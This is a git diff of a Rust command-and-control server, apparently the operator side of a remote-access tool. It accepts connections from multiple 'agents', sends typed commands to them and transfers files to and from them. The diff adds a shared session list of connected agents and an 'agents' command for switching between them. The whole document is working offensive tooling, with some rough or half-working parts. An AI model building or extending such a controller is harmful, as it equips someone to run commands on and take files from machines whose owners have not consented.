@@ -1,19 +1,15 @@
 use std::process::{Command,exit};
 use std::io::{self, Write, BufReader, BufRead};
 use std::net::Ipv4Addr;
-
-// server program with multi connections
-// read write privs anywhere on disk if ran as current user
-
 use std::mem::drop;
 use std::net::{Shutdown, SocketAddrV4, TcpListener, TcpStream};
 
-fn handle_connection(clientsocket: &mut TcpStream){
-    println!("Client connected: {}", clientsocket.local_addr().unwrap());
+fn handle_connection(clientsocket: &mut TcpStream, clients: &Arc<Mutex<HashMap<String, TcpStream>>>) {
+    println!("New client connected: {}", clientsocket.local_addr().unwrap());
     let clientaddr = clientsocket.peer_addr().unwrap();
+    let client_list = clients.lock().unwrap().keys().cloned().collect::<Vec<String>>();
+    let num_clients = client_list.len();
     println!(" 
-    _______________________________________________________
-
 
         ███████████   ██████████ ██████████      ███████    █████ █████
         ░░███░░░░░███ ░░███░░░░░█░░███░░░░███   ███░░░░░███ ░░███ ░░███ 
@@ -24,13 +20,16 @@ fn handle_connection(clientsocket: &mut TcpStream){
          █████   █████ ██████████ ██████████   ░░░███████░   █████ █████
         ░░░░░   ░░░░░ ░░░░░░░░░░ ░░░░░░░░░░      ░░░░░░░    ░░░░░ ░░░░░ 
                                                                     
-        _______________________________________________________       
+        _______________________________________________________________       
+        Active:   Server: {} <- Client: {}      
+        _______________________________________________________________
+        ({:?} Agents in Session List):
 
-        Type 'rtfm' for a menu of built in shortcuts
+        {:?}
+        _______________________________________________________________
 
-        If multiple clients are connected, you can exit current sessions by typing 'quit' to switch to the next connected client        
+        Type 'rtfm' for help \n", clientsocket.local_addr().unwrap(),clientaddr,num_clients,client_list,); //,clients.keys(), clientsocket.local_addr().unwrap(),clientaddr); // {:?} inside Map
 
-        Client connected: {} <- {}\n", clientsocket.local_addr().unwrap(),clientaddr);
     loop {
         println!("Enter Command to send: ");
         let mut msg = String::new();
@@ -96,6 +95,16 @@ fn handle_connection(clientsocket: &mut TcpStream){
             println!("Sent flnm{}", &msgfn);
             let mut reader = BufReader::new(clientsocket.try_clone().unwrap());
             clientrx(&mut msgfn);
+        } else if (msg.trim().contains("agents")){
+            if let Some(last_client) = client_list.last() {
+                println!("The current active Agent is: {}", last_client);
+            } else {
+                println!("No clients connected");
+            }
+            println!("We have {} Active agents", num_clients);
+            println!("With ID's: {:?}\n", client_list);
+            //println!("The current active Agent is: {}", num_clients.last());
+            continue;
         } else {
             msg.push('\0');
             let mut buffer: Vec<u8> = Vec::new();
@@ -111,18 +120,21 @@ fn handle_connection(clientsocket: &mut TcpStream){
                 println!(" tx,                       Asks for filename to send from server in current directory\n");
                 println!(" rx,                       Asks for filename to receive from client in current directory\n");
                 println!(" quit,                     Quits current client connection\n");
+                println!(" agents,                   Shows connected devices. Typing 'quit' to switch to the next connected client\n");
             } else if cfg!(unix) { 
                 println!("Usage: [COMMAND]           Gives result\n");
                 println!(" dl,                       Asks for source url and filename to write\n");
                 println!(" tx,                       Asks for filename to send from server in current directory\n");
                 println!(" rx,                       Asks for filename to receive from client in current directory\n");
                 println!(" quit,                     Displays quits current client connection\n");
+                println!(" agents,                   Shows connected devices. Typing 'quit' to switch to the next connected client\n");
             } else if cfg!(target_os = "macos") {
                 println!("Usage: [COMMAND]           Gives result\n");
                 println!(" dl,                       Asks for source url and filename to write\n");
                 println!(" tx,                       Asks for filename to send from server in current directory\n");
                 println!(" rx,                       Asks for filename to receive from client in current directory\n");
                 println!(" quit,                     Displays quits current client connection\n");
+                println!(" agents,                   Shows connected devices. Typing 'quit' to switch to the next connected client\n");
             }
         }
         msg.push('\0');
@@ -132,8 +144,7 @@ fn handle_connection(clientsocket: &mut TcpStream){
             clientsocket.shutdown(Shutdown::Both);
             println!("end of connections, crtl + c to terminate server program: {}", clientsocket.local_addr().unwrap());
             break;
-        }
-        // shortcut for help in all platforms 
+        } 
         
         let mut reader = BufReader::new(clientsocket.try_clone().unwrap());
         reader.read_until(b'\0', &mut buffer);
@@ -145,7 +156,7 @@ fn handle_connection(clientsocket: &mut TcpStream){
 // this cannot take in the filename from but almost works otherwise
 use std::io::{Read};
 use std::path::Path;
-fn handle_client_rx(mut stream: TcpStream){//,filenm: &mut String) { //, filepath: &mut String
+fn handle_client_rx(mut stream: TcpStream){
     let mut filename = [0; 128];
     let bytes_read = stream.read(&mut filename).unwrap();
     let original_filename = std::str::from_utf8(&filename[..bytes_read]).unwrap().trim();
@@ -243,6 +254,8 @@ pub async fn download_file(client: &Client, url: &str, path: &str) -> Result<(),
 use std::thread;
 use tokio::runtime::Runtime;
 use tokio::time::{sleep, Duration};
+use std::collections::HashMap;
+use std::sync::{Arc, Mutex};
 
 #[tokio::main]
 async fn main() { 
@@ -261,23 +274,46 @@ async fn main() {
     println!("Port: {}", s.port());
 
     let listener = TcpListener::bind(s);
-
     let listener: () = match listener {
         Ok(l) => {
             println!("Successfully binded to {}", l.local_addr().unwrap());
         }
         Err(e) => {println!("{}",e); exit(0);}
     };
+ 
     let listener = TcpListener::bind(format!("{}:5358", ip)).unwrap();
+    let clients: Arc<Mutex<HashMap<String, TcpStream>>> = Arc::new(Mutex::new(HashMap::new()));
 
     // v2 using multi threading
     for stream in listener.incoming() {
         match stream {
             Ok(mut stream) => {
+                let clients_clone = clients.clone();
+                let client_id = stream.peer_addr().unwrap().to_string();
+                 // Add the new client to the hashmap
+                 clients_clone.lock().unwrap().insert(client_id.clone(), stream.try_clone().unwrap());
+
+                 // Print the list of connected clients
+                 let client_list = clients_clone.lock().unwrap()
+                 .keys()
+                 .map(|s| s.as_ref())
+                 .collect::<Vec<&str>>()
+                 .iter()
+                 .map(|s| s.to_string())
+                 .collect::<Vec<String>>();
+
+                // Spawn a new thread to handle incoming connections
                 thread::spawn(move|| {
                     // connection succeeded
-                    //tx();
-                    handle_connection(&mut stream);
+                    // tx();
+                    handle_connection(&mut stream, &clients_clone);
+                    // Remove the client from the hashmap when the connection is closed
+                    clients_clone.lock().unwrap().remove(&client_id);
+                    // Print the updated list of connected clients
+                    //let client_list = clients_clone.lock().unwrap().keys().collect::<Vec<&String>>();
+                    let client_list = clients_clone.lock().unwrap().keys().cloned().collect::<Vec<String>>();
+
+                    println!("Connected clients: {:?}", client_list);
                 });
             }
             Err(e) => { /* connection failed */ }
